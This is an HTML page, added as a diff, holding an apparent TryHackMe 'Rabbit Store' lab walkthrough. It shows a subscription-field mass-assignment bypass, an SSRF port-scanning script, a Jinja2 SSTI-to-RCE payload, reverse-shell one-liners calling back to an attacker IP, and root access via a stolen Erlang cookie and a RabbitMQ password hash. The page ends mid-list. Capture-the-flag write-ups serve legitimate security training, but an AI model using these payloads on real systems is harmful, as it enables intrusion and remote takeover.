@@ -1,0 +1,1050 @@
+<!DOCTYPE html>
+
+<html lang="en">
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+<title>Rabbit Store • syndro</title>
+<script>
+    (function() {
+      const saved = localStorage.getItem('theme');
+      const prefersLight = window.matchMedia('(prefers-color-scheme: light)').matches;
+      if (saved === 'light' || (!saved && prefersLight)) document.documentElement.classList.add('light');
+      else document.documentElement.classList.remove('light');
+    })();
+  </script>
+<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700;900&amp;family=Roboto+Mono:wght@300;400;700&amp;display=swap" rel="stylesheet"/>
+<link href="././style.css" rel="stylesheet"/>
+<style>
+    :root { --accent:#58a6ff; --green:#3fb950; --purple:#8b5cf6; --pink:#f472b6; }
+    .light { --accent:#1f6feb; --green:#238636; }
+    body{
+      background: linear-gradient(135deg,#0f0c29,#302b63,#24243e);
+      color:#e6edf3;
+      font-family:'Roboto Mono', monospace;
+      min-height:100vh;
+      padding:40px 20px;
+      line-height:1.8;
+      transition: background .5s, color .5s;
+    }
+    .light body{ background:#f6f8fa; color:#0d1117; }
+    .container{ max-width:1100px; margin:0 auto; }
+
+    h1{
+      font-family:'Orbitron',sans-serif;
+      font-size:4.8rem;
+      text-align:center;
+      background:linear-gradient(90deg,var(--accent),var(--purple),var(--pink));
+      -webkit-background-clip:text;
+      -webkit-text-fill-color:transparent;
+      margin:18px 0 8px;
+      text-shadow:0 0 30px rgba(88,166,255,.3);
+    }
+    .meta{
+      text-align:center;
+      opacity:.92;
+      font-size:1.1rem;
+      margin-bottom:18px;
+    }
+    .meta span{ color:var(--accent); font-weight:700; }
+
+    .topbar{
+      display:flex;
+      justify-content:center;
+      gap:12px;
+      flex-wrap:wrap;
+      margin:18px 0 42px;
+    }
+    .btn{
+      border:1px solid rgba(88,166,255,.35);
+      background:rgba(88,166,255,.08);
+      color:inherit;
+      padding:10px 14px;
+      border-radius:12px;
+      cursor:pointer;
+      font-family:inherit;
+      transition: transform .18s ease, box-shadow .18s ease, background .18s ease;
+      text-decoration:none;
+      display:inline-flex;
+      align-items:center;
+      gap:8px;
+    }
+    .btn:hover{
+      transform: translateY(-1px);
+      box-shadow:0 10px 30px rgba(88,166,255,.18);
+      background:rgba(88,166,255,.14);
+    }
+
+    h2{
+      color:var(--accent);
+      margin:56px 0 16px;
+      font-family:'Orbitron',sans-serif;
+      font-size:2.2rem;
+    }
+    h3{
+      margin:30px 0 12px;
+      font-family:'Orbitron',sans-serif;
+      font-size:1.35rem;
+      opacity:.95;
+    }
+    p{ margin:14px 0; }
+
+    pre{
+      background:#161b22 !important;
+      color:#f0f6fc !important;
+      padding:18px;
+      border-radius:14px;
+      overflow-x:auto;
+      border:1px solid #30363d;
+      font-size:1.02rem;
+      margin:16px 0;
+      white-space:pre-wrap;
+    }
+    .light pre{
+      background:#f6f8fa !important;
+      color:#24292f !important;
+      border:1px solid #d0d7de !important;
+    }
+
+    code{
+      background:rgba(88,166,255,.1);
+      padding:3px 9px;
+      border-radius:8px;
+      color:var(--green);
+    }
+
+    a{
+      color:inherit;
+      text-decoration:none;
+      border-bottom:1px dashed rgba(88,166,255,.45);
+    }
+    a:hover{ color:var(--accent); }
+
+    .muted{ opacity:.9; }
+
+    ul{ margin:12px 0; padding-left:34px; }
+    li{ margin:10px 0; }
+
+    .toc{
+      border:1px solid rgba(88,166,255,.3);
+      background:rgba(88,166,255,.08);
+      padding:16px 18px;
+      border-radius:14px;
+      margin:18px 0 22px;
+    }
+    .toc a{ border-bottom:1px dashed rgba(88,166,255,.45); }
+
+    .callout{
+      border:1px solid rgba(63,185,80,.35);
+      background:rgba(63,185,80,.08);
+      padding:16px 18px;
+      border-radius:14px;
+      margin:18px 0;
+    }
+    .callout strong{ color:var(--green); }
+
+    figure{ margin:22px 0; }
+    figure img{
+      display:block;
+      max-width:100%;
+      border-radius:16px;
+      margin:0 auto;
+      box-shadow:0 20px 60px rgba(0,0,0,.6);
+      border:2px solid rgba(88,166,255,.3);
+      cursor:zoom-in !important;
+      transition: transform .35s ease, box-shadow .35s ease;
+      user-select:none;
+    }
+    figure img:hover{
+      transform:scale(1.02);
+      box-shadow:0 25px 80px rgba(88,166,255,.6);
+    }
+    figcaption{
+      text-align:center;
+      opacity:.85;
+      margin-top:10px;
+      font-size:.95rem;
+    }
+
+    /* Image Zoom Modal */
+    #imageModal{
+      position:fixed; inset:0;
+      background:rgba(0,0,0,.85);
+      display:none;
+      align-items:center;
+      justify-content:center;
+      z-index:9999;
+      padding:20px;
+    }
+    #imageModal.active{ display:flex; }
+    #imageModal img{
+      max-width:min(1100px,96vw);
+      max-height:92vh;
+      border-radius:16px;
+      border:2px solid rgba(88,166,255,.35);
+      box-shadow:0 30px 90px rgba(0,0,0,.8);
+      cursor:zoom-out;
+    }
+    .close-modal{
+      position:fixed; top:18px; right:18px;
+      font-size:34px;
+      line-height:34px;
+      width:44px; height:44px;
+      display:grid; place-items:center;
+      border-radius:12px;
+      background:rgba(255,255,255,.08);
+      border:1px solid rgba(255,255,255,.14);
+      cursor:pointer;
+      user-select:none;
+    }
+    .back {
+    position: fixed;
+    top: 30px;
+    left: 30px;
+    background: var(--accent);
+    color: #000;
+    padding: 16px 42px;
+    border-radius: 50px;
+    font-weight: bold;
+    text-decoration: none;
+    box-shadow: 0 12px 40px rgba(88,166,255,0.6);
+    transition: all 0.4s ease;
+    z-index: 9999;
+    font-size: 1.1rem;
+  }
+  .back:hover { transform: translateY(-8px) scale(1.05); box-shadow: 0 20px 60px rgba(88,166,255,0.8); }
+  .light .back { color: white; }
+
+    .footer{ margin-top:70px; opacity:.85; text-align:center; font-size:.95rem; }
+  </style>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&amp;display=swap" rel="stylesheet"/><style id="wh-unified-style">
+/* ===== cyber-whisperer unified writeup UI (blue-ish) ===== */
+body.wh-writeup{
+  --wh-accent: #58a6ff;
+  --wh-accent2:#06b6d4;
+  --wh-surface: rgba(13,17,23,.62);
+  --wh-surface2: rgba(17,24,39,.55);
+  --wh-border: rgba(88,166,255,.22);
+  --wh-text: #e6edf3;
+  --wh-muted: rgba(230,237,243,.72);
+  --wh-shadow: rgba(0,0,0,.55);
+  background:
+    radial-gradient(1200px 700px at 12% 10%, rgba(88,166,255,.22), transparent 55%),
+    radial-gradient(900px 650px at 88% 18%, rgba(6,182,212,.18), transparent 52%),
+    radial-gradient(950px 680px at 50% 92%, rgba(139,92,246,.16), transparent 58%),
+    linear-gradient(135deg,#070a16,#111a33 45%,#07101f);
+  color: var(--wh-text);
+  padding: 70px 18px 60px;
+  min-height: 100vh;
+  overflow-x: hidden;
+}
+
+html.light body.wh-writeup{
+  --wh-accent:#1f6feb;
+  --wh-accent2:#0891b2;
+  --wh-surface: rgba(255,255,255,.78);
+  --wh-surface2: rgba(255,255,255,.66);
+  --wh-border: rgba(31,111,235,.20);
+  --wh-text: #0d1117;
+  --wh-muted: rgba(13,17,23,.70);
+  --wh-shadow: rgba(0,0,0,.12);
+  background:
+    radial-gradient(1200px 700px at 12% 10%, rgba(31,111,235,.18), transparent 55%),
+    radial-gradient(900px 650px at 88% 18%, rgba(8,145,178,.14), transparent 52%),
+    radial-gradient(950px 680px at 50% 92%, rgba(124,58,237,.12), transparent 58%),
+    linear-gradient(180deg,#f8fafc,#eef2ff);
+}
+
+body.wh-writeup::before{
+  content:"";
+  position: fixed;
+  inset:0;
+  pointer-events:none;
+  z-index:-1;
+  background-image:
+    linear-gradient(rgba(88,166,255,.10) 1px, transparent 1px),
+    linear-gradient(90deg, rgba(88,166,255,.10) 1px, transparent 1px);
+  background-size: 86px 86px;
+  opacity:.22;
+  mask-image: radial-gradient(circle at 50% 35%, rgba(0,0,0,.95) 0, rgba(0,0,0,0) 70%);
+}
+
+#whProgress{
+  position: fixed;
+  top:0; left:0;
+  width:100%;
+  height:4px;
+  z-index:100000;
+  background: rgba(255,255,255,.06);
+}
+#whProgress > div{
+  height:100%;
+  width:0%;
+  background: linear-gradient(90deg, var(--wh-accent), var(--wh-accent2), #8b5cf6);
+  box-shadow: 0 0 20px rgba(88,166,255,.45);
+}
+
+.wh-shell{
+  max-width: 1500px;
+  margin: 0 auto;
+  display: grid;
+  grid-template-columns: minmax(0, 1fr) 320px;
+  gap: 22px;
+  align-items: start;
+}
+@media (max-width: 1150px){
+  .wh-shell{ grid-template-columns: 1fr; }
+}
+
+body.wh-writeup .container{
+  max-width: 100% !important;
+  margin: 0 !important;
+  padding: 28px 28px 32px !important;
+  border-radius: 26px;
+  background: linear-gradient(180deg, var(--wh-surface), var(--wh-surface2));
+  border: 1px solid var(--wh-border);
+  box-shadow: 0 24px 80px var(--wh-shadow);
+  backdrop-filter: blur(14px);
+  position: relative;
+}
+
+body.wh-writeup .container::after{
+  content:"";
+  position:absolute;
+  inset:0;
+  border-radius:26px;
+  pointer-events:none;
+  background: radial-gradient(600px 220px at 30% 0%, rgba(88,166,255,.14), transparent 60%);
+  opacity: .8;
+}
+
+body.wh-writeup h1{
+  letter-spacing: .5px;
+  margin-top: 6px !important;
+}
+
+body.wh-writeup .meta{
+  color: var(--wh-muted) !important;
+  margin-bottom: 16px !important;
+}
+
+body.wh-writeup .topbar{
+  position: sticky;
+  top: 14px;
+  z-index: 9999;
+  display:flex;
+  flex-wrap: wrap;
+  gap: 10px;
+  justify-content: center;
+  padding: 12px 12px;
+  border-radius: 18px;
+  background: rgba(0,0,0,.18);
+  border: 1px solid rgba(255,255,255,.10);
+  backdrop-filter: blur(12px);
+  box-shadow: 0 14px 40px rgba(0,0,0,.25);
+  margin: 14px 0 28px !important;
+}
+html.light body.wh-writeup .topbar{ background: rgba(255,255,255,.55); border-color: rgba(31,111,235,.12); }
+
+body.wh-writeup .btn{
+  border: 1px solid rgba(88,166,255,.28) !important;
+  background: rgba(88,166,255,.10) !important;
+  color: inherit !important;
+  padding: 10px 14px !important;
+  border-radius: 999px !important;
+  cursor: pointer;
+  font-family: inherit;
+  transition: transform .18s ease, box-shadow .18s ease, background .18s ease, border-color .18s ease;
+  text-decoration: none;
+  display: inline-flex;
+  align-items: center;
+  gap: 8px;
+  user-select: none;
+}
+body.wh-writeup .btn:hover{
+  transform: translateY(-1px);
+  background: rgba(88,166,255,.16) !important;
+  border-color: rgba(88,166,255,.55) !important;
+  box-shadow: 0 18px 45px rgba(88,166,255,.18);
+}
+
+body.wh-writeup .btn.wh-primary{
+  background: linear-gradient(90deg, rgba(88,166,255,.22), rgba(6,182,212,.20)) !important;
+  border-color: rgba(88,166,255,.55) !important;
+}
+
+body.wh-writeup h2, body.wh-writeup h3, body.wh-writeup .toc{ scroll-margin-top: 120px; }
+
+.wh-aside{
+  position: sticky;
+  top: 92px;
+}
+@media (max-width:1150px){
+  .wh-aside{ position: relative; top: 0; }
+}
+
+.wh-aside-card{
+  border-radius: 22px;
+  padding: 18px 16px;
+  background: linear-gradient(180deg, rgba(13,17,23,.55), rgba(17,24,39,.45));
+  border: 1px solid rgba(88,166,255,.20);
+  box-shadow: 0 18px 60px rgba(0,0,0,.35);
+  backdrop-filter: blur(12px);
+}
+html.light .wh-aside-card{ background: rgba(255,255,255,.65); border-color: rgba(31,111,235,.14); box-shadow: 0 18px 60px rgba(0,0,0,.10); }
+
+.wh-aside-title{
+  font-family: 'Inter', system-ui, -apple-system, Segoe UI, Roboto, sans-serif;
+  font-weight: 700;
+  letter-spacing: .2px;
+  color: var(--wh-text);
+  margin: 2px 6px 10px;
+  opacity: .92;
+}
+
+#whToc a{
+  display:flex;
+  gap:10px;
+  align-items: baseline;
+  padding: 9px 10px;
+  border-radius: 14px;
+  border: 1px solid transparent;
+  text-decoration:none;
+  color: var(--wh-muted);
+  font-size: .98rem;
+  line-height: 1.2;
+}
+#whToc a:hover{
+  color: var(--wh-text);
+  border-color: rgba(88,166,255,.20);
+  background: rgba(88,166,255,.10);
+}
+#whToc a.active{
+  color: var(--wh-text);
+  border-color: rgba(88,166,255,.38);
+  background: rgba(88,166,255,.16);
+}
+#whToc .wh-dot{
+  width: 8px; height: 8px;
+  border-radius: 50%;
+  margin-top: 3px;
+  background: rgba(88,166,255,.30);
+  flex: 0 0 auto;
+}
+#whToc a.active .wh-dot{ background: rgba(88,166,255,.90); box-shadow: 0 0 18px rgba(88,166,255,.55); }
+
+/* Make images & code blocks feel less "floating" */
+body.wh-writeup pre{ box-shadow: 0 18px 60px rgba(0,0,0,.35) !important; }
+html.light body.wh-writeup pre{ box-shadow: 0 18px 60px rgba(0,0,0,.08) !important; }
+
+/* Subtle section dividers */
+body.wh-writeup h2{
+  position: relative;
+  padding-bottom: 10px;
+}
+body.wh-writeup h2::after{
+  content:"";
+  position:absolute;
+  left:0;
+  bottom: 0;
+  width: 120px;
+  height: 2px;
+  background: linear-gradient(90deg, var(--wh-accent), transparent);
+  opacity: .85;
+}
+</style></head>
+<body class="wh-writeup"><div id="whProgress"><div></div></div>
+<a class="back" href="../Tryhackme.html">Back</a>
+<div class="wh-shell"><div class="container">
+<h1>Rabbit Store</h1>
+<div class="meta">TryHackMe • Linux • <span>Medium</span> • Target: <span>cloudsite.thm</span> / <span>storage.cloudsite.thm</span></div>
+<div class="topbar">
+<button class="btn" id="themeToggle" type="button">🌓 Toggle theme</button>
+<a class="btn" href="#goals">🎯 Goals</a>
+<a class="btn" href="#hosts">🧩 Hostnames</a>
+<a class="btn" href="#recon">🛰️ Recon</a>
+<a class="btn" href="#web-enum">🧪 Web enum</a>
+<a class="btn" href="#bac">🪪 Access control</a>
+<a class="btn" href="#api">🧭 API</a>
+<a class="btn" href="#ssrf">🕳️ SSRF</a>
+<a class="btn" href="#ssti">🧨 SSTI</a>
+<a class="btn" href="#privesc">⚡ PrivEsc</a>
+</div>
+<div class="toc" id="goals">
+<p><strong>Questions to answer</strong></p>
+<ul>
+<li><strong>User</strong> flag</li>
+<li><strong>Root</strong> flag</li>
+</ul>
+</div>
+<h2 id="hosts">0) Hostname setup</h2>
+<p>
+      The box uses virtual hosts. Before you start browsing, map the target IP to the domains used by the app.
+    </p>
+<pre><code>sudo vim /etc/hosts
+
+10.80.139.58 cloudsite.thm www.cloudsite.thm</code></pre>
+<h2 id="recon">1) Recon</h2>
+<h3>1.1 Nmap sweep (full TCP)</h3>
+<p>
+      Start broad: scan all TCP ports and grab service/version info. Saving output helps later when you want to
+      grep for hints (like “Erlang” or “Rabbit”).
+    </p>
+<pre><code>nmap -T4 -p- -A -r -Pn -v -sV -oN scan.nmap 10.80.139.58</code></pre>
+<figure>
+<img alt="Nmap results" src="Pasted image 20260217112240.png"/>
+<figcaption>Nmap results: SSH + HTTP, plus Erlang/RabbitMQ-related ports.</figcaption>
+</figure>
+<p>
+      The normal services are there (<code>22</code> SSH, <code>80</code> HTTP), but the real “bookmark these for later”
+      items are the Erlang/RabbitMQ ports:
+    </p>
+<ul>
+<li><code>4369</code> — EPMD (Erlang Port Mapper Daemon)</li>
+<li><code>25672</code> — Erlang distribution / RabbitMQ clustering (very useful once you have the cookie)</li>
+</ul>
+<div class="callout">
+<strong>Pointer:</strong> When you see Erlang ports, assume a hidden “cookie” is the key.
+      You often won’t exploit these directly from the outside—usually you first gain a foothold, then steal <code>.erlang.cookie</code>.
+    </div>
+<p>Background references:</p>
+<ul>
+<li><a href="https://book.hacktricks.wiki/en/network-services-pentesting/4369-pentesting-erlang-port-mapper-daemon-epmd.html" rel="noreferrer" target="_blank">HackTricks: EPMD (4369)</a></li>
+<li><a href="https://hackviser.com/tactics/pentesting/services/rabbitmq" rel="noreferrer" target="_blank">Hackviser: RabbitMQ ports</a></li>
+</ul>
+<h2 id="web-enum">2) Web enumeration</h2>
+<h3>2.1 Content discovery (ffuf)</h3>
+<p>
+      Quick directory fuzzing against the main vhost. Here we also try common extensions.
+    </p>
+<pre><code>ffuf -u http://cloudsite.thm/FUZZ \
+  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
+  -fc 404 -s -e .php,.txt,.html</code></pre>
+<figure>
+<img alt="ffuf results" src="Pasted image 20260217112153.png"/>
+<figcaption>ffuf finds <code>/assets</code> but it’s not immediately useful.</figcaption>
+</figure>
+<p>
+<code>/assets</code> exists, but doesn’t lead to an obvious vulnerability. So instead of forcing a dead-end,
+      we pivot to how the app actually wants us to use it (login/register flow, subdomains, etc.).
+    </p>
+<h2 id="bac">3) Broken access control → “active” subscription</h2>
+<p>
+      The login/register link pushes us to a different host, so we add another vhost entry:
+    </p>
+<pre><code>sudo vim /etc/hosts
+
+10.80.139.58 storage.cloudsite.thm www.storage.cloudsite.thm</code></pre>
+<p>Register a normal user first to see the baseline behavior.</p>
+<figure>
+<img alt="register page" src="Pasted image 20260217115456.png"/>
+<figcaption>Registration page on the storage portal domain.</figcaption>
+</figure>
+<p>After login, the app blocks us because the account is “inactive”.</p>
+<figure>
+<img alt="inactive message" src="Pasted image 20260217115527.png"/>
+<figcaption>New users are inactive by default (subscription gate).</figcaption>
+</figure>
+<h3>3.1 Inspect the session token (JWT)</h3>
+<p>
+      Cookies include a JWT. Decoding it reveals fields like the email and subscription state (handy for understanding the model).
+    </p>
+<figure>
+<img alt="jwt decode" src="Pasted image 20260217115705.png"/>
+<figcaption>JWT decoded: subscription state is visible inside the token.</figcaption>
+</figure>
+<div class="callout">
+<strong>Pointer:</strong> If the app uses JWTs, don’t immediately go “crack the secret”.
+      First question: “Can I set privileged fields earlier (registration / profile update)?”
+    </div>
+<h3>3.2 Intercept registration and set subscription to active</h3>
+<p>
+      Instead of editing a signed token, we intercept the <strong>register</strong> request and try injecting a subscription field
+      before the server stores the user.
+    </p>
+<figure>
+<img alt="burp intercept register" src="Pasted image 20260217115936.png"/>
+<figcaption>Intercepting the register request in Burp.</figcaption>
+</figure>
+<p>Baseline request:</p>
+<pre><code>{
+  "email": "admin2@example.com",
+  "password": "admin"
+}</code></pre>
+<p>Upgraded request:</p>
+<pre><code>{
+  "email": "admin2@example.com",
+  "password": "admin",
+  "subscription": "active"
+}</code></pre>
+<div class="callout">
+<strong>Pointer:</strong> This is a classic server-side validation failure.
+      Privileged fields must be computed server-side, not trusted from client JSON.
+    </div>
+<h2 id="api">4) Portal access + first attempts</h2>
+<p>Login with the new “active” account and the portal opens.</p>
+<figure>
+<img alt="storage dashboard" src="Pasted image 20260217120336.png"/>
+<figcaption>Portal access granted once subscription is active.</figcaption>
+</figure>
+<p>Three primary features show up:</p>
+<ul>
+<li><strong>Upload file</strong> (classic “can I upload a webshell?” temptation)</li>
+<li><strong>Upload from URL</strong> (often SSRF)</li>
+<li><strong>View/list uploads</strong> (storage view)</li>
+</ul>
+<h3>4.1 Upload restrictions</h3>
+<p>
+      Uploading an executable payload doesn’t work out of the box because the server:
+      renames files and strips extensions. That kills most “upload → execute” paths.
+    </p>
+<figure>
+<img alt="upload extension stripped" src="Pasted image 20260217120601.png"/>
+<figcaption>Uploads get renamed and extensions are removed.</figcaption>
+</figure>
+<div class="callout">
+<strong>Pointer:</strong> When upload execution is blocked, don’t tunnel-vision on bypasses.
+      Features like “fetch from URL” can be far more dangerous than uploads.
+    </div>
+<h3>4.2 API hint: <code>/api/uploads/</code> → enumerate</h3>
+<p>
+      The routing suggests an API backing the portal, so we fuzz under <code>/api</code>.
+    </p>
+<figure>
+<img alt="api fuzz" src="Pasted image 20260217121056.png"/>
+<figcaption>API endpoint discovery attempt.</figcaption>
+</figure>
+<p>
+<code>/api/docs</code> looks promising, but we’re blocked:
+    </p>
+<figure>
+<img alt="api docs denied" src="Pasted image 20260217121043.png"/>
+<figcaption><code>/api/docs</code> is access denied (likely internal-only).</figcaption>
+</figure>
+<div class="callout">
+<strong>Pointer:</strong> Internal docs are gold. If you can SSRF into them, you often skip hours of guessing endpoints/params.
+    </div>
+<h2 id="ssrf">5) SSRF via “Upload from URL”</h2>
+<p>
+      The “store URL” feature lets the server fetch a URL and store it. First test:
+      can it fetch <code>localhost</code>? If yes, SSRF is in play.
+    </p>
+<p>
+      The annoying part: <code>http://localhost/</code> returns the main site, not the internal API docs we want.
+      That usually means the internal service is on a different port. So we port-hunt through SSRF.
+    </p>
+<h3>5.1 Automate SSRF port discovery</h3>
+<p>
+      The idea: repeatedly POST JSON with <code>{"url":"http://localhost:PORT/"}</code> to <code>/api/store-url</code>
+      and flag responses that don’t match the normal “denied” response.
+    </p>
+<pre><code>import requests
+from concurrent.futures import ThreadPoolExecutor
+import sys
+
+TARGET = "http://storage.cloudsite.thm/api/store-url"
+JWT = "&lt;your_jwt_cookie_value_here&gt;"   # cookie name: jwt
+
+ports = range(1, 65535)
+cookies = {"jwt": JWT}
+headers = {"Content-Type": "application/json"}
+
+done = 0
+
+def scan(port: int):
+    global done
+    payload = {"url": f"http://localhost:{port}/"}
+    try:
+        r = requests.post(TARGET, headers=headers, cookies=cookies, json=payload, timeout=3)
+        done += 1
+        sys.stdout.write(f"\\r[*] {done}/{len(ports)} (port {port})")
+        sys.stdout.flush()
+
+        # Heuristic used in the notes: ignore the common denied pattern.
+        if r.status_code != 401 and len(r.text) != 41:
+            print(f"\\n[+] Interesting port {port}: status={r.status_code}, size={len(r.text)}")
+    except Exception:
+        done += 1
+
+print("[*] Starting SSRF port scan...")
+with ThreadPoolExecutor(max_workers=100) as ex:
+    ex.map(scan, ports)</code></pre>
+<figure>
+<img alt="ssrf port scan output" src="Pasted image 20260217130104.png"/>
+<figcaption>SSRF port scan: <code>3000</code> is the important one for docs.</figcaption>
+</figure>
+<p>
+      Several ports respond “differently”, but <strong>3000</strong> is the one that reveals the docs.
+      With that, we can SSRF into the API documentation.
+    </p>
+<h3>5.2 Read internal API docs</h3>
+<figure>
+<img alt="api docs page 1" src="Pasted image 20260217130319.png"/>
+<figcaption>Internal API docs (page 1).</figcaption>
+</figure>
+<figure>
+<img alt="api docs page 2" src="Pasted image 20260217130337.png"/>
+<figcaption>Internal API docs (page 2) showing additional endpoints.</figcaption>
+</figure>
+<p>
+      The endpoint we care about:
+      <code>/api/fetch_messeges_from_chatbot</code> (typo included, which often hints it wasn’t well-reviewed).
+    </p>
+<h3>5.3 Call it through Burp</h3>
+<p>For quick iteration:</p>
+<ul>
+<li>Send a <code>POST</code></li>
+<li><code>Content-Type: application/json</code></li>
+<li>Body includes a <code>username</code> parameter</li>
+</ul>
+<figure>
+<img alt="burp request" src="Pasted image 20260217130720.png"/>
+<figcaption>Calling the chatbot endpoint in Burp.</figcaption>
+</figure>
+<p>It reflects our input back:</p>
+<figure>
+<img alt="reflected username" src="Pasted image 20260217130758.png"/>
+<figcaption>Reflected input suggests server-side rendering (SSTI possibility).</figcaption>
+</figure>
+<div class="callout">
+<strong>Pointer:</strong> Reflection isn’t automatically SSTI — but it’s enough to justify a low-noise template probe.
+    </div>
+<h2 id="ssti">6) SSTI → RCE → user flag</h2>
+<h3>6.1 Probe for SSTI (polyglot)</h3>
+<figure>
+<img alt="ssti polyglot" src="Pasted image 20260217131028.png"/>
+<figcaption>Polyglot SSTI test indicates template execution is happening.</figcaption>
+</figure>
+<h3>6.2 Confirm engine with arithmetic</h3>
+<p>A fast Jinja-style sanity check:</p>
+<pre><code>{{7*7}}</code></pre>
+<figure>
+<img alt="7*7 works" src="Pasted image 20260217131132.png"/>
+<figcaption>Arithmetic evaluates → strong confirmation of Jinja2 SSTI.</figcaption>
+</figure>
+<h3>6.3 Escalate to OS command execution</h3>
+<p>Now we pull <code>os</code> from globals and run a harmless command first:</p>
+<pre><code>{{config.__class__.__init__.__globals__['os'].popen('id').read()}}</code></pre>
+<figure>
+<img alt="id output" src="Pasted image 20260217131402.png"/>
+<figcaption>RCE confirmed (command output returned).</figcaption>
+</figure>
+<div class="callout">
+<strong>Pointer:</strong> Always prove execution with something safe (<code>id</code>/<code>whoami</code>).
+      Then switch to a reverse shell so you’re not fighting a one-line output UI.
+    </div>
+<h3>6.4 Reverse shell</h3>
+<p>Start a listener:</p>
+<pre><code>nc -lvnp 1234</code></pre>
+<p>Trigger a shell (replace <code>&lt;YOUR_IP&gt;</code> with your attacker IP):</p>
+<pre><code>{{config.__class__.__init__.__globals__['os'].popen('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc &lt;YOUR_IP&gt; 1234 &gt;/tmp/f').read()}}</code></pre>
+<figure>
+<img alt="reverse shell hit" src="Pasted image 20260217132037.png"/>
+<figcaption>Reverse shell triggered and caught on the listener.</figcaption>
+</figure>
+<figure>
+<img alt="shell obtained" src="Pasted image 20260217132116.png"/>
+<figcaption>Interactive shell on the target.</figcaption>
+</figure>
+<p>Grab the user flag:</p>
+<figure>
+<img alt="user flag" src="Pasted image 20260217132144.png"/>
+<figcaption>User flag obtained.</figcaption>
+</figure>
+<div class="callout">
+<strong>Pointer:</strong> Post-shell “must do” checklist:
+      <ul>
+<li><code>id</code>, <code>hostname</code>, <code>pwd</code>, <code>ip a</code></li>
+<li>Stabilize shell if needed (<code>python3 -c 'import pty;pty.spawn("/bin/bash")'</code>)</li>
+<li>Search configs/vars/cron/services for creds, especially anything RabbitMQ/Erlang related</li>
+</ul>
+</div>
+<h2 id="privesc">7) PrivEsc: Erlang cookie → RabbitMQ admin → root</h2>
+<h3>7.1 The “Erlang cookie” is the pivot</h3>
+<p>
+      Those Erlang ports we saw earlier become useful once we obtain the shared cookie file.
+      If we can read <code>.erlang.cookie</code>, we can often interact with RabbitMQ internals.
+    </p>
+<h3>7.2 Locate <code>.erlang.cookie</code></h3>
+<figure>
+<img alt="cookie location" src="Pasted image 20260217132718.png"/>
+<figcaption>Cookie file discovered on disk.</figcaption>
+</figure>
+<p>Cookie value:</p>
+<pre><code>wNkProKxfl30BVjY</code></pre>
+<div class="callout">
+<strong>Pointer:</strong> If you ever see <code>.erlang.cookie</code> readable by your current user, that’s usually game-changing.
+      Treat it like a password for RabbitMQ’s internal communication.
+    </div>
+<h3>7.3 Use Erlang distribution helper (shell-erldp)</h3>
+<p>Helper script used in the original notes:</p>
+<p><a href="https://github.com/gteissier/erl-matter/blob/master/shell-erldp.py" rel="noreferrer" target="_blank">shell-erldp.py</a></p>
+<p>Connect (adjust IP if needed):</p>
+<pre><code>python2 shell-erldp.py 10.80.139.58 25672 wNkProKxfl30BVjY</code></pre>
+<p>Upgrade to a cleaner reverse shell (example):</p>
+<pre><code>python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("&lt;YOUR_IP&gt;",1233));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'</code></pre>
+<figure>
+<img alt="rabbit shell" src="Pasted image 20260217143836.png"/>
+<figcaption>Shell obtained as the RabbitMQ service user.</figcaption>
+</figure>
+<h3>7.4 Fix cookie permissions (important)</h3>
+<p>RabbitMQ tooling can be picky: lock down cookie perms so commands behave.</p>
+<pre><code>chmod 600 .erlang.cookie</code></pre>
+<figure>
+<img alt="chmod cookie" src="Pasted image 20260217144232.png"/>
+<figcaption>Cookie permissions adjusted.</figcaption>
+</figure>
+<h3>7.5 Create a RabbitMQ administrator user</h3>
+<p>Once you can run <code>rabbitmqctl</code>, create an admin user:</p>
+<pre><code>rabbitmqctl add_user &lt;username&gt; &lt;password&gt;
+rabbitmqctl set_user_tags &lt;username&gt; administrator</code></pre>
+<figure>
+<img alt="add admin user" src="Pasted image 20260217144625.png"/>
+<figcaption>New RabbitMQ admin user created.</figcaption>
+</figure>
+<div class="callout">
+<strong>Pointer:</strong> Useful follow-up enumeration:
+      <ul>
+<li><code>rabbitmqctl list_users</code></li>
+<li><code>rabbitmqctl list_permissions -p /</code></li>
+<li><code>rabbitmqctl environment</code></li>
+</ul>
+</div>
+<h3>7.6 Extract root’s stored hash</h3>
+<figure>
+<img alt="root hash" src="Pasted image 20260217144904.png"/>
+<figcaption>Root record / hash recovered from RabbitMQ internals.</figcaption>
+</figure>
+<pre><code>{
+  "name":"root",
+  "password_hash":"49e6hSldHRaiYX329+ZjBSf/Lx67XEOz9uxhSBHtGU+YBzWF",
+  "hashing_algorithm":"rabbit_password_hashing_sha256",
+  "tags":["administrator"],
+  "limits":{}
+}</code></pre>
+<h3>7.7 Hash format (salt + SHA-256 → base64)</h3>
+<p>
+      RabbitMQ’s documented format implies:
+    </p>
+<ul>
+<li>Salt is 32 bits → <strong>4 bytes</strong></li>
+<li>SHA-256 is 256 bits → <strong>32 bytes</strong></li>
+<li>Stored value is Base64( salt || sha256(...) )</li>
+</ul>
+<figure>
+<img alt="rabbitmq hashing docs" src="Pasted image 20260217145002.png"/>
+<figcaption>Hashing format reference (as used in the original notes).</figcaption>
+</figure>
+<h3>7.8 Decode base64 and split salt/hash</h3>
+<pre><code>import base64, binascii
+
+hash_b64 = "49e6hSldHRaiYX329+ZjBSf/Lx67XEOz9uxhSBHtGU+YBzWF"
+raw = base64.b64decode(hash_b64)
+
+salt = raw[:4]
+digest = raw[4:]
+
+print("Salt:", binascii.hexlify(salt).decode())
+print("Hash:", binascii.hexlify(digest).decode())</code></pre>
+<figure>
+<img alt="decoded salt hash" src="Pasted image 20260217151115.png"/>
+<figcaption>Decoded salt + SHA-256 digest extracted.</figcaption>
+</figure>
+<h3>7.9 Switch to root</h3>
+<pre><code>su - root
+Password: 295d1d16a2617df6f7e6630527ff2f1ebb5c43b3f6ec614811ed194f98073585</code></pre>
+<figure>
+<img alt="root shell" src="Pasted image 20260217151151.png"/>
+<figcaption>Root access achieved.</figcaption>
+</figure>
+<div class="callout">
+<strong>Final pointers / lessons learned:</strong>
+<ul>
+<li><strong>Registration endpoints matter</strong>: if the server trusts client JSON fields, roles/subscriptions can be self-assigned.</li>
